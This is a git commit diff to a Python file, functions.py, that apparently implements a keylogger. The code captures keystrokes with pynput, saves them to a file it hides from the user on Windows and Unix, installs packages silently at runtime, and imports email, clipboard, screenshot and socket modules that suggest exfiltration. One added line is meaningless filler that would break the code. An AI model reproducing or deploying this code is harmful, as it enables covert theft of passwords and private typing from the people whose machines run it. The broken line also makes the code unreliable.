4475b84a8cd13e8cf23b70e0bc9df9f3823b9af6
VadAxel <58472614+VadAxel@users.noreply.github.com>
2023-03-12 15:06:05 +0100

    u

--- functions.py
+++ functions.py
@@ -1,14 +1,14 @@
 ########################################
 # IMPORTS
 ########################################
-
+import os
 import ctypes
 import subprocess
 import sys
 import threading
 
 # email
-"""
+
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MINEText
 from email.mime.base import MIMEBase
@@ -18,11 +18,11 @@ import socket
 import platform
 
 import win32clipboard
-
+sssssssssssssssssssssssssssssssssssssssssssssdsdsdd
 # info
 
 import time
-import os
+
 
 # sound
 
@@ -42,13 +42,13 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 # Check if the `pynput` package is installed
-"""
+
 ########################################
 # config
 ########################################
 
 subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pynput'])
-subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
+#subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ncat'])
 from pynput.keyboard import Key, Listener
 # Hidden file attribute
 FILE_ATTRIBUTE_HIDDEN = 0x02
@@ -86,9 +86,6 @@ def on_release(tang):
 
 # Write the pressed tangs to file
 def write_file(tangs):
-    """
-    Cross-platform hidden file writer.
-    """
     # For *nix systems, add a '.' prefix to the file name
     prefix = '.' if os.name != 'nt' else ''
     file_name = prefix + 'tjo.txt'
@@ -109,15 +106,10 @@ def write_file(tangs):
         ret = ctypes.windll.kernel32.SetFileAttributesW(file_name, FILE_ATTRIBUTE_HIDDEN)
         if not ret:
             raise ctypes.WinError()
-        
-########################################
-# rs
-########################################
 
 ########################################
 # start
 ########################################
-
 
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
